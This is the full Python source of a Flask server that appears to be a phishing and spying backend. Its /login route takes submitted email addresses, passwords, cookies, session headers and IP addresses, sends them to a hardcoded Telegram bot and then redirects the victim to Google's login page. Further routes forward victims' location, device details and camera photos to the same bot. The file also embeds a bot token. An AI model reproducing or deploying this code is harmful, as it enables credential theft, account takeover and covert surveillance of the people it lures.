from flask import Flask, request, render_template, redirect, make_response
import os
import requests
import json

app = Flask(__name__)

BOT_TOKEN = '7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg'
CHAT_ID = '6908281054'


def send_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'HTML'}
    requests.post(url, data=payload)


def send_photo(photo_file):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    files = {'photo': (photo_file.filename, photo_file.stream, photo_file.mimetype)}
    data = {'chat_id': CHAT_ID}
    requests.post(url, data=data, files=files)


@app.route('/')
def index():
    response = make_response(render_template('index.html'))
    response.set_cookie("visited", "true")
    return response


@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('password')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    cookies = request.cookies
    session_data = request.headers.get('Cookie')

    msg = f"""
🔐 <b>Login Captured</b>
📧 Email: <code>{email}</code>
🔑 Password: <code>{password}</code>
🌐 IP: <code>{ip}</code>
🍪 Cookies: <code>{cookies}</code>
📦 Session: <code>{session_data}</code>
"""
    send_telegram(msg)
    return redirect('https://accounts.google.com')


@app.route('/collect', methods=['POST'])
def collect():
    data = request.get_json()
    if data:
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        lat = data.get('latitude')
        lon = data.get('longitude')
        city = data.get('city')
        country = data.get('country')
        timezone = data.get('timezone')
        camera = data.get('camera')
        user_agent = data.get('userAgent')
        device = data.get('deviceInfo')
        maps_link = data.get('mapsLink')

        msg = f"""
🕵️‍♂️ <b>SpyBot Alert</b>
📌 IP Address: <code>{ip}</code>
📍 Location: {lat}, {lon}
🌆 City: {city}, 🌍 Country: {country}
🕐 Timezone: {timezone}
🗺️ Map: {maps_link}
📷 Camera: {camera}
🧠 Device: {device}
🌐 UserAgent: {user_agent}
"""
        send_telegram(msg)
    return 'ok'


@app.route('/photo', methods=['POST'])
def photo():
    if 'photo' in request.files:
        photo = request.files['photo']
        send_photo(photo)
    return 'photo received'


if __name__ == '__main__':
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
